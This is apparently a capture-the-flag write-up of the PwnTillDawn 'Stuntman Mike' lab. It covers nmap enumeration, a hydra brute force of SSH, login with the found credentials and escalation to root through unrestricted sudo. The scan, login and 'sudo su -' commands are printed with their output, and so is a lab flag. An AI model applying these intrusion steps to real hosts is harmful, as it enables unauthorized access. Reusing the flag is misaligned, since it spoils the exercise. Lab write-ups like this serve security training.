---
title: "PwnTillDawn - Stuntman Mike"
author: Nasrallah
description: ""
date: 2022-05-17 00:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, linux, hydra]
---

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Stuntman Mike]() from [PwnTillDawn](https://online.pwntilldawn.com/) and [Wizlynxgroup](https://www.wizlynxgroup.com). This is an easy linux machine, running a ssh server on port 22 and a webserver on port 8089. When we try to connect to ssh, the server reveals some useful information, we use that to brute force ssh and we find valid credentials. After login to the machine via ssh, we find that we can run any command as root, so we can easily change user to root. Let's get started.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.166
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:9e:99:ed:7e:e0:d5:83:ad:c9:ba:7c:f1:bc:44:06 (RSA)
|   256 7e:53:59:7b:2d:6c:3b:d7:21:28:cb:cb:78:af:99:78 (ECDSA)
|_  256 c5:d2:2d:04:f9:69:40:4c:15:34:36:fe:83:1f:f3:44 (ED25519)
8089/tcp open  ssl/http Splunk httpd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-25T09:15:13
|_Not valid after:  2022-10-24T09:15:13
```

There are two open ports, 22(SSH) and 8089(ssl/http).

## Web

Let's navigate to the webserver https://10.150.150.166:8089

![](/assets/img/pwntilldawn/stuntman/1.png)

The webserver is running splunkd version 8.0.0, which there no vulnerabilities on this version.

## SSH

Let's try to connect to ssh.

![](/assets/img/pwntilldawn/stuntman/2.png)

Wow, we got the flag and a username.

# **Foothold**

Let's brute force ssh using `hydra`.

![](/assets/img/pwntilldawn/stuntman/3.png)

Great! We got the password for mike. Let's login.

```bash
$ ssh mike@10.150.150.166
You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360
mike@10.150.150.166's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage



  System load:  0.0                Processes:            166
  Usage of /:   28.6% of 19.56GB   Users logged in:      1
  Memory usage: 20%                IP address for ens33: 10.150.150.166
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

18 packages can be updated.
0 updates are security updates.

mike@stuntmanmike:~$ 
```

# **Privilege Escalation**

Let's check our privileges wit `sudo-l`

```bash
mike@stuntmanmike:~$ sudo -l
[sudo] password for mike: 
Matching Defaults entries for mike on stuntmanmike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on stuntmanmike:
    (ALL : ALL) ALL
mike@stuntmanmike:~$
```

Great! We can run any command as root.

Let's get a root shell by running `sudo su -`

```bash
mike@stuntmanmike:~$ sudo su -
[sudo] password for mike: 
root@stuntmanmike:~# id
uid=0(root) gid=0(root) groups=0(root)
root@stuntmanmike:~#
```
---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
